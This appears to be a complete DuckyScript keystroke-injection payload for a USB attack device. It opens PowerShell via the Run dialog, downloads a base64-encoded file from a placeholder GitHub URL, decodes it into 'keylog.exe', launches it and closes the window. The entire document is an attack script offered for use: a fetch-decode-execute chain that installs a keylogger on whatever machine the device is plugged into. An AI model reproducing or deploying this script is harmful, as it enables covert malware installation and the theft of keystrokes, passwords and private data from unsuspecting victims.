REM Open PowerShell
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000


REM Download encoded executable
STRING $url='https://raw.YOUR_GITHUB_REPO.COM/PATH/TO/ENCODED/FILE.TXT'; $out='PLACEHOLDER_ENCODED_EXE.TXT'; Invoke-WebRequest -Uri $url -OutFile $out
ENTER
DELAY 1000

REM Decode the file and save as .exe
STRING $data=Get-Content -Path PLACEHOLDER_ENCODED_EXE.TXT; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('keylog.exe', $decoded)
ENTER
DELAY 1000

REM Execute the decoded .exe file
STRING Start-Process -FilePath .\keylog.exe
ENTER
DELAY 500

REM Close PowerShell
STRING exit
ENTER
